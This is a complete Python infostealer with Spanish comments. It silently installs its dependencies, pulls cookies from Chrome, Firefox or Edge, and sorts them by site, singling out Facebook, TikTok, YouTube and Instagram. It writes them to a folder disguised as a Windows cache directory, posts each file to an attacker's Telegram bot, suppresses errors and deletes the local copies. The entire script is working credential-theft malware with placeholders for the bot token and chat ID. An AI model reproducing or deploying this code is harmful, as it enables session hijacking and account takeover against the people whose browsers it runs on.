import os
import browser_cookie3
import requests
import subprocess
import sys
from http.cookiejar import Cookie
from collections import defaultdict

# Función para instalar dependencias automáticamente (silenciosamente)
def instalar_dependencias():
    requerimientos = ['browser-cookie3', 'requests']
    for paquete in requerimientos:
        try:
            __import__(paquete.replace('-', '_'))
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", paquete], 
                                stdout=subprocess.DEVNULL, 
                                stderr=subprocess.DEVNULL)

# Instalar dependencias al inicio
instalar_dependencias()

# Ruta camuflada en disco local (C:)
ruta_oculta = os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Windows', 'INetCache')
os.makedirs(ruta_oculta, exist_ok=True)

# Función para formatear cookies
def formatear_cookie(cookie: Cookie) -> str:
    host = cookie.domain
    flag = "TRUE" if cookie.domain.startswith('.') else "FALSE"
    path = cookie.path
    secure = "TRUE" if cookie.secure else "FALSE"
    expires = cookie.expires or 0
    name = cookie.name
    value = cookie.value
    return f"{host}\t{flag}\t{path}\t{secure}\t{expires}\t{name}\t{value}"

# Obtener cookies de todos los navegadores posibles
def obtener_cookies():
    navegadores = [browser_cookie3.chrome, browser_cookie3.firefox, browser_cookie3.edge]
    for navegador in navegadores:
        try:
            return navegador()
        except:
            continue
    return []

cookies = obtener_cookies()
cookies_por_dominio = defaultdict(list)

# Clasificación de cookies (conservando tus nombres originales)
for cookie in cookies:
    dominio = cookie.domain.lower()
    if "facebook" in dominio:
        archivo = "facebook.txt"
    elif "tiktok" in dominio:
        archivo = "tiktok.txt"
    elif "youtube" in dominio:
        archivo = "youtube.txt"
    elif "instagram" in dominio:
        archivo = "instagram.txt"
    else:
        archivo = dominio.replace(".", "").replace("-", "") + ".txt"
    
    linea = formatear_cookie(cookie)
    cookies_por_dominio[archivo].append(linea)

# Configuración Telegram (reemplaza con tus datos)
TOKEN = 'tu_token_aqui'  # Aquí pones el token de tu bot de Telegram @BotFather
CHAT_ID = 'tu_chat_id_aqui'  # Aquí pones el chat_id que obtuviste del @userinfoBot 

# Procesar y enviar archivos
for archivo, lineas in cookies_por_dominio.items():
    file_path = os.path.join(ruta_oculta, archivo)
    
    try:
        # Guardar temporalmente
        with open(file_path, "w", encoding="utf-8") as f:
            f.write("\n".join(lineas))
        
        # Enviar a Telegram (sin mensajes de confirmación)
        with open(file_path, 'rb') as file:
            requests.post(
                f"https://api.telegram.org/bot{TOKEN}/sendDocument",
                data={'chat_id': CHAT_ID},
                files={'document': file},
                timeout=10
            )
    except:
        pass
    finally:
        # Eliminar archivo local después de enviar
        try:
            os.remove(file_path)
        except:
            pass
